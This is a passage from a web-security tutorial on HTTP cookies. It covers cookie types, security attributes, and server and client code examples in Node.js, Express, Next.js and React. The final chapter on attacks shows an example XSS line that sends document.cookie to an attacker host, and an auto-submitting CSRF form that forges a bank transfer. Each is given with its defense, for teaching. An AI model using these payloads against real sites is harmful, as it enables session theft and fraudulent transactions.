# PART IV: Cookies

## Chapter 15: Understanding Cookies

### What are Cookies?
An HTTP Cookie is a small piece of data (maximum 4KB) that a server sends to a user's web browser. The browser stores it and automatically sends it back with every subsequent request to the same server. 
Cookies are the fundamental transport mechanism for web authentication. While you *can* transport authentication tokens via HTTP Headers (e.g., `Authorization: Bearer <token>`), Cookies provide built-in, automated security features handled directly by the browser engine.

### Types of Cookies
1. **Session Cookies:** Do not have an `Expires` or `Max-Age` attribute. They are deleted when the browser shuts down. (Note: Many modern browsers use "Session Restore" which keeps these alive longer than expected).
2. **Persistent Cookies:** Have an `Expires` date or a `Max-Age`. They survive browser restarts and are deleted only when the expiration is reached or the user manually clears them.
3. **First-Party Cookies:** Set by the domain the user is currently visiting (e.g., you are on `amazon.com` and the cookie is for `amazon.com`).
4. **Third-Party Cookies:** Set by a domain other than the one the user is visiting (e.g., you are on `nytimes.com` but an ad script sets a cookie for `doubleclick.net`). These are currently being phased out by all major browsers due to privacy concerns.

### Browser Behavior
The beauty of cookies lies in browser automation. Once a server sets a cookie, frontend developers do not need to write any JavaScript to attach that cookie to future requests. If you use `fetch()` or `XMLHttpRequest` (with credentials included), or if the user navigates via an `<a>` tag, the browser handles the cookie injection at the network layer.

---

## Chapter 16: Cookie Security Attributes

A raw cookie is highly insecure. To make a cookie suitable for authentication, you must configure its Security Attributes. This is one of the most common sources of security vulnerabilities in web applications.

### 1. `Secure`
- **What it does:** The cookie will only be sent to the server over an encrypted (HTTPS) connection. It will never be sent over HTTP.
- **Why we need it:** Prevents Man-In-The-Middle (MITM) attackers from sniffing the network to steal session cookies on public Wi-Fi.
- **Production Note:** Always `true` in production. Can be `false` during local development on `localhost`.

### 2. `HttpOnly`
- **What it does:** Prevents client-side JavaScript (e.g., `document.cookie`) from accessing the cookie.
- **Why we need it:** Defends against Cross-Site Scripting (XSS) attacks. If an attacker injects malicious JS into your site, they cannot read the cookie to steal the session. The browser network stack can still send it, but JS cannot touch it.
- **Rule:** Authentication cookies must ALWAYS be `HttpOnly`.

### 3. `SameSite`
- **What it does:** Controls whether the browser sends the cookie along with cross-site requests.
- **Why we need it:** Defends against Cross-Site Request Forgery (CSRF) attacks.
- **Values:**
  - `Strict`: The cookie is only sent if the request originates from the same site that set the cookie. (Safest, but can break UX if a user clicks a link from an email to your site).
  - `Lax`: The cookie is not sent on cross-site subrequests (like images or frames), but is sent when the user navigates to the origin site (e.g., following a link). **This is the modern default.**
  - `None`: The cookie is sent on all requests. Must be paired with the `Secure` attribute. Used primarily for third-party widgets and SSO flows.

### 4. `Domain` and `Path`
- **Domain:** Specifies which hosts can receive a cookie. If unspecified, it defaults to the host that set the cookie, *excluding* subdomains. If specified as `Domain=example.com`, it includes subdomains like `api.example.com`.
- **Path:** Indicates the URL path that must exist in the requested URL for the browser to send the Cookie header. `Path=/` means all paths.

### 5. `Max-Age` and `Expires`
- **Expires:** An absolute HTTP date (e.g., `Expires=Wed, 21 Oct 2026 07:28:00 GMT`).
- **Max-Age:** A relative time in seconds (e.g., `Max-Age=3600` for 1 hour). If both are set, `Max-Age` takes precedence.

---

## Chapter 17: Cookie Implementation Examples

### 1. Node.js (Raw HTTP)
```javascript
import http from 'http';

http.createServer((req, res) => {
    if (req.url === '/login') {
        // Set an authentication cookie
        res.writeHead(200, {
            'Set-Cookie': 'auth_token=super_secret_jwt; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Path=/',
            'Content-Type': 'text/plain'
        });
        res.end('Logged in!');
    }
}).listen(3000);
```

### 2. Express.js
Express uses the `cookie-parser` middleware to read cookies, and the built-in `res.cookie()` method to set them.

```javascript
import express from 'express';
import cookieParser from 'cookie-parser';

const app = express();
app.use(cookieParser());

app.post('/login', (req, res) => {
    const token = generateJWT(req.body.user);
    
    // Express simplifies setting cookies
    res.cookie('token', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 1000 * 60 * 60 * 24 // 1 day in milliseconds
    });
    
    res.send('Login successful');
});

app.get('/protected', (req, res) => {
    // Read the cookie
    const token = req.cookies.token;
    if (!token) return res.status(401).send('Unauthorized');
    res.send('Secret Data');
});
```

### 3. Next.js (App Router - API Route)
Next.js provides the `cookies()` function from `next/headers` to manipulate cookies on the server.

```typescript
// app/api/login/route.ts
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
    // ... validate credentials ...
    const token = "jwt_token_here";

    // Await the cookies instance in Next.js 15+ (or use synchronous in older versions)
    const cookieStore = await cookies();
    
    cookieStore.set('auth-token', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        path: '/',
        maxAge: 60 * 60 * 24 * 7 // 1 week
    });

    return NextResponse.json({ success: true });
}
```

### 4. React (Client-Side)
**Warning:** You should **never** read or write authentication cookies using client-side React. If your React app can read the cookie using `document.cookie` or a library like `js-cookie`, then it means the cookie is missing the `HttpOnly` flag, rendering your app highly vulnerable to XSS.
Instead, let the browser handle it. When React makes an API call, use `credentials: 'include'` (Fetch) or `withCredentials: true` (Axios).

```javascript
// React Client-Side Fetch Example
const fetchProtectedData = async () => {
    const response = await fetch('https://api.example.com/data', {
        method: 'GET',
        // CRITICAL: This tells the browser to attach the HttpOnly cookie
        credentials: 'include' 
    });
    const data = await response.json();
};
```

---

## Chapter 18: Cookie Attacks (XSS and CSRF)

### XSS (Cross-Site Scripting)
If an attacker manages to inject a malicious script into a webpage (e.g., by posting `<script>...</script>` in a forum comment), that script executes in the victim's browser. 
If your authentication cookie lacks `HttpOnly`, the attacker's script runs:
`fetch('https://attacker.com/steal?cookie=' + document.cookie)`
**Defense:** `HttpOnly`.

### CSRF (Cross-Site Request Forgery)
If a user is logged into `bank.com`, their browser holds a cookie for `bank.com`. If they visit `malicious.com`, that site could contain a hidden form:
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```
When this form submits, the browser historically would automatically attach the `bank.com` cookie, and the bank would execute the transfer thinking the user authorized it.
**Defense:** `SameSite=Lax` or `SameSite=Strict`. The browser will refuse to attach the cookie because the request originated from `malicious.com`.
